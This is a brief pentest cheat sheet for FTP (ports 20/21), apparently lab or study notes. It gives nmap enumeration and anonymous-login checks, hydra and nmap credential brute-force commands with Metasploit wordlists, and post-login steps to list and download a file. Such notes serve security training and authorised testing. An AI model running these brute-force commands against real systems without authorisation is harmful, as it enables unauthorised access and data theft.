# ii - FTP - 20,21

`nmap $ip -Pn -p21 -sV -O` - basic enumeration.

`ftp $ip` - logging in to ftp.

### Ftp Anonymous Login

`nmap $ip -p21 --script ftp-anon` - check if anon login is allowed.

### Bruteforce FTP creds with \[hydra] utility

`hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P usr/share/metasploit-framework/data/wordlists/unix_passwords.txt $ip ftp` - performs a bruteforce for ftp.

```bash
# cmds to run after login success.
ls    # list directories.
get secret.txt    # download file.
```

### Bruteforce FTP creds with \[nmap] bruteforcer

`nmap $ip --script ftp-brute --script-args userdb=/root/users -p 21` - nmap brute force.

